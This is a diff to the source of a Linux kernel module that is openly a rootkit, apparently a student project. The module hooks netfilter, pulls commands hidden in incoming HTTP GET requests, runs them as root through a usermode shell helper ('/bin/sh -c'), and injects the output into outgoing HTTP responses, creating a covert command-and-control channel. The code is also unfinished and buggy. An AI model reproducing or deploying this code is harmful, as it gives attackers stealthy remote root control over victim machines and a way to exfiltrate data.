@@ -11,12 +11,7 @@
 #include <linux/kthread.h> 
 #include "hidder.h"
 #include "cnc.h"
-#include "intercom.h"
-#include "signals.h"
-
-
-static struct task_struct *thread1 = NULL;
-
+#include "usermode.h"
 
 #define MALWARE_FUNC "colman-function"
 #define MALWARE_ARG "colman-arg"
@@ -39,6 +34,7 @@ typedef enum {
 	KILL
 }COMMANDS;
 
+
 #define MAX_HTTP_HEADER_LEN 2048
 #define MAX_HTTP_DATA_LEN 1024
 #define MINIMUM_CNC_DATA 170-24
@@ -50,21 +46,22 @@ typedef enum {
 
 #define TOT_HDR_LEN 28
 
+
 typedef struct _result_msg{
 	char * msg;
 	int len;
 }result_msg;
 
 
-typedef struct _run_cmd_args{
-	char * arg;
-	unsigned int arg_len;	
-}run_cmd_args;
-
-static int run_usermode_cmd( void *arguments);
-
-
+// Global struct for the result msg
 result_msg * global_result_msg = NULL;
+
+// Struct for the usermode thread handler
+static struct task_struct *um_thread = NULL;
+
+// Global struct for the usermode thread handler arguments
+run_cmd_args * um_thread_args = NULL;
+
 
 char result_ready = 0;
 
@@ -132,43 +129,43 @@ unsigned int http_callback_result( unsigned int hooknum, struct sk_buff *pskb, c
 		return NF_ACCEPT;
 	}
 
-	//printk("[+] Colman: saddr = %d.%d.%d.%d\n",*(unsigned char *)(&iph->saddr), *(unsigned char *)(&iph->saddr + 1), *(unsigned char *)(&iph->saddr + 2), *(unsigned char *)(&iph->saddr + 3));
-	printk("[+] Colman: HTTP GET DETECTED -> CHANGE PACKET\n");
+	//printk(KERN_INFO "[+] Colman: saddr = %d.%d.%d.%d\n",*(unsigned char *)(&iph->saddr), *(unsigned char *)(&iph->saddr + 1), *(unsigned char *)(&iph->saddr + 2), *(unsigned char *)(&iph->saddr + 3));
+	printk(KERN_INFO "[+] Colman: HTTP GET DETECTED -> CHANGE PACKET\n");
 	
 
 	if (unlikely(skb_linearize(pskb) != 0))
 	{
-		printk("[-] Colman: not linear\n");
+		printk(KERN_INFO "[-] Colman: not linear\n");
 		return NF_ACCEPT;
 	}
 
 	space_left = skb_tailroom(pskb);
 	if (space_left == 0)
 	{
-		printk("[-] Colman: check is needed\n");
+		printk(KERN_INFO "[-] Colman: check is needed\n");
 		return NF_ACCEPT;	
 	}
   	
-	printk("[+] Colman: space left: %d\n", skb_tailroom(pskb));
+	printk(KERN_INFO "[+] Colman: space left: %d\n", skb_tailroom(pskb));
 
-    printk("[+] Colman: data_len: %d\n", ntohs(iph->tot_len));
+    printk(KERN_INFO "[+] Colman: data_len: %d\n", ntohs(iph->tot_len));
 
-    printk("[+] Colman: new data_len: %d\n", ntohs(htons(2 + ntohs(iph->tot_len))));
+    printk(KERN_INFO "[+] Colman: new data_len: %d\n", ntohs(htons(2 + ntohs(iph->tot_len))));
 
   	result_msg_len =  strlen(result_header) + strlen(result_header_end) + global_result_msg->len;
-	printk("[+] Colman: len: %d\n", result_msg_len);
+	printk(KERN_INFO "[+] Colman: len: %d\n", result_msg_len);
 
 	if (space_left < result_msg_len)
 	{
 		// We can extend the space left
-		printk("[-] Colman: Not enougth space\n");
+		printk(KERN_INFO "[-] Colman: Not enougth space\n");
 		return NF_ACCEPT;
 	}
   	ptr = (char*) skb_put(pskb, result_msg_len); 
 
   	if (!ptr)
   	{
-		printk("[-] Colman: Something want wrong\n");
+		printk(KERN_INFO "[-] Colman: Something want wrong\n");
 		return NF_ACCEPT;  		
   	}
 
@@ -176,14 +173,14 @@ unsigned int http_callback_result( unsigned int hooknum, struct sk_buff *pskb, c
 
   	if (!global_result_msg)
   	{
-		printk("[-] Colman: No result\n");
+		printk(KERN_INFO "[-] Colman: No result\n");
 		return NF_ACCEPT;  		
   	}
 
 
   	if (!global_result_msg->msg)
   	{
-		printk("[-] Colman: No result\n");
+		printk(KERN_INFO "[-] Colman: No result\n");
 		return NF_ACCEPT;  		
   	}
 
@@ -194,7 +191,7 @@ unsigned int http_callback_result( unsigned int hooknum, struct sk_buff *pskb, c
     
     /* Manipulating necessary header fields */
     iph->tot_len = htons(result_msg_len + ntohs(iph->tot_len));
-    printk("[+] Colman: New tot len 0x%x\n", iph->tot_len);
+    printk(KERN_INFO "[+] Colman: New tot len 0x%x\n", iph->tot_len);
     //tcph->len = htons(tot_data_len + TCP_HDR_LEN);
 
     /* Calculation of IP header checksum */
@@ -207,74 +204,12 @@ unsigned int http_callback_result( unsigned int hooknum, struct sk_buff *pskb, c
     len = pskb->len - offset;
     tcph->check = ~csum_tcpudp_magic((iph->saddr), (iph->daddr), len, IPPROTO_TCP, 0);
 
-	//printk("[+] Colman: saddr = %d.%d.%d.%d\n",*(unsigned char *)(&iph->saddr), *(unsigned char *)(&iph->saddr + 1), *(unsigned char *)(&iph->saddr + 2), *(unsigned char *)(&iph->saddr + 3));
-	printk("[+] Colman: PACKET Changed\n");
+	//printk(KERN_INFO "[+] Colman: saddr = %d.%d.%d.%d\n",*(unsigned char *)(&iph->saddr), *(unsigned char *)(&iph->saddr + 1), *(unsigned char *)(&iph->saddr + 2), *(unsigned char *)(&iph->saddr + 3));
+	printk(KERN_INFO "[+] Colman: PACKET Changed\n");
 	result_ready = 0;
 	return NF_ACCEPT;
 }
 
-
-static int run_usermode_cmd( void *arguments)
-{
-
-	struct subprocess_info *sub_info;
-	char final_cmd[MAX_COMMAND_LEN];
-	char * argv[] = { "/bin/sh", "-c", final_cmd , NULL };
-	static char *envp[] = {
-	    "HOME=/",
-	    "TERM=linux",
-	    "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL };
- 
-	char tmp_output[] = "ls > /home/shahart/colman_rootkit/output";
-	unsigned int arg_len = strlen(tmp_output);
-
-	run_cmd_args * args = (run_cmd_args *)arguments;
-
-	if (args == NULL)
-	{
-		printk("[-] Colman: Failed to pass arguments.");
-		goto exit_thread;
-	} 
-	printk("[+] Colman: THREAD exit.\n");
-	goto exit_thread;
- 	//printk("here! len! %d\n", args->arg_len);
- 	//run_cmd_args * a = (run_cmd_args *)arguments;
-	
-	
-	//char output_file_cmd[] = " > /home/shahart/colman_rootkit/output";
-	
-	memcpy(final_cmd, tmp_output, arg_len);
-	final_cmd[arg_len] = 0x0;
-	
-	//char * final_cmd = kmalloc(sizeof(char) * (strlen(arg) + strlen(output_file_cmd) + 2), GFP_ATOMIC );
-
-	//memcpy(final_cmd, arg, strlen(arg));
-	//memcpy(final_cmd + strlen(arg), output_file_cmd, strlen(output_file_cmd) + 1);
-
-
-	printk("[+] Colman: command: %s.\n", final_cmd);
-	sub_info = call_usermodehelper_setup( argv[0], argv, envp, GFP_ATOMIC, NULL,NULL,NULL );	
-	if (!sub_info)
-		goto exit_thread;
-
-	call_usermodehelper_exec( sub_info, UMH_WAIT_PROC );
-
-exit_thread: 
-	do_exit(0);
-}
-
-
-static void simple( void *arguments)
-{
-	// run_cmd_args * a = (run_cmd_args*)arguments;
-	// if (a)
-	// 	printk("arg_len = %d.", a->arg_len);
-	
-	printk("[+] Colman: Simple thread\n");
-	//kthread_should_stop();
-	kthread_exit();
-	//do_exit(0);
-}
 
 unsigned int http_callback_get_command( unsigned int hooknum, struct sk_buff *pskb, const struct net_device *in, const struct net_device *out, int (*okfn)(struct sk_buff *) )
 {
@@ -287,7 +222,6 @@ unsigned int http_callback_get_command( unsigned int hooknum, struct sk_buff *ps
 	char command[MAX_COMMAND_LEN];
 	int i = 0, index = 0;
 	long command_num = 1;
-	run_cmd_args cmd_arguments;
 	iph = ip_hdr(pskb);
 	if (NULL == iph) {
 		return NF_ACCEPT;
@@ -324,8 +258,8 @@ unsigned int http_callback_get_command( unsigned int hooknum, struct sk_buff *ps
 	if (*httph != GET ) { // Not GET
 		return NF_ACCEPT;
 	}
-	printk("[+] Colman: HTTP GET DETECTED -> EXEC COMMANDS\n");
-	//printk("[+] Colman: saddr = %d.%d.%d.%d:\n",*(unsigned char *)(&iph->saddr), *(unsigned char *)(&iph->saddr + 1), *(unsigned char *)(&iph->saddr + 2), *(unsigned char *)(&iph->saddr + 3));
+	printk(KERN_INFO "[+] Colman: HTTP GET DETECTED -> EXEC COMMANDS\n");
+	//printk(KERN_INFO "[+] Colman: saddr = %d.%d.%d.%d:\n",*(unsigned char *)(&iph->saddr), *(unsigned char *)(&iph->saddr + 1), *(unsigned char *)(&iph->saddr + 2), *(unsigned char *)(&iph->saddr + 3));
 
 	index = find_malware_struct(tcp_data, MALWARE_FUNC);
 	if (!index)
@@ -343,17 +277,17 @@ unsigned int http_callback_get_command( unsigned int hooknum, struct sk_buff *ps
 	}
 	command[i-2] = 0x0;
 
-	printk("[+] Colman: cmd: %s\n", command);
+	printk(KERN_INFO "[+] Colman: cmd: %s\n", command);
 	if (kstrtol(command, 10, &command_num) != 0)
 	{
-    	printk("[-] Colman: Invlid command.\n");
+    	printk(KERN_INFO "[-] Colman: Invlid command.\n");
 		return NF_ACCEPT;
 	}
 
 	switch ((COMMANDS)command_num) {
 		case TEST :
-			set_result_msg("file:start_web.sh", strlen("file:start_web.sh"));
-			printk("[+] Colman: OK\n");
+			set_result_msg("MALWARE ON", strlen("MALWARE ON"));
+			printk(KERN_INFO "[+] Colman: OK\n");
 			break;
 		case KILL:
 			set_result_msg("Bye", strlen("Bye"));
@@ -381,17 +315,23 @@ unsigned int http_callback_get_command( unsigned int hooknum, struct sk_buff *ps
 				}
 				command[i-2] = 0x0;
 
-				//printk("arg: %s", command);
+				//printk(KERN_INFO "arg: %s", command);
 				
 				//cmd_arguments.arg_len = 0;
 				//run_cmd_args * a = (run_cmd_args *)kmalloc(sizeof(run_cmd_args), GFP_ATOMIC);
-				//a->arg_len = 112;
-				thread1 = kthread_run(simple, NULL, "thread");
+				um_thread_args->arg_len = 112;
+				um_thread_args->arg = (char *)kmalloc(sizeof(char) * i-1, GFP_ATOMIC);
+				memcpy(um_thread_args->arg, command, i-1);
 
-				if (thread1)
+				// um_thread_args->arg[0] = 'l';
+				// um_thread_args->arg[1] = 's';
+				// um_thread_args->arg[2] = 0x0;
+
+				if (um_thread)
 				{
-					printk("[?] Colman: HERE!!");
-					return NF_ACCEPT;
+					wake_up_process(um_thread);
+					//printk(KERN_INFO "[?] Colman: HERE!!");
+					//return NF_ACCEPT;
 				}
 				
 				set_result_msg("file:output", strlen("file:output"));
@@ -407,7 +347,7 @@ unsigned int http_callback_get_command( unsigned int hooknum, struct sk_buff *ps
 		default:
 
 			set_result_msg("Invalid command", strlen("Invalid command"));
-			printk("[-] Colman: Invalid command - %ld\n", command_num);
+			printk(KERN_INFO "[-] Colman: Invalid command - %ld\n", command_num);
 			break;
 	}
 	
@@ -424,9 +364,12 @@ int find_malware_struct(void * address, char * string)
 
 void set_http_callback( void )
 {
-
-
+	//cmd_arguments.arg_len = 0;
 	set_result_msg("Init", strlen("Init"));
+
+	um_thread_args = (run_cmd_args *)kmalloc(sizeof(run_cmd_args), GFP_ATOMIC);
+	um_thread = kthread_create(simple, um_thread_args, "um_thread");
+
 	http_hook_in.hook = (void *)http_callback_get_command;
 	http_hook_in.hooknum = NF_INET_PRE_ROUTING;
 	http_hook_in.pf = PF_INET;
@@ -467,7 +410,14 @@ void unset_http_callback ( void )
 	nf_unregister_hook(&http_hook_out);
 #endif
 
-	kfree(global_result_msg->msg);
-	kfree(global_result_msg);
+	if (global_result_msg->msg)
+		kfree(global_result_msg->msg);
+	if (global_result_msg)
+		kfree(global_result_msg);
+	if (um_thread_args)
+		kfree(um_thread_args);
+
+	if(um_thread)
+		kthread_stop(um_thread); 
 }
 
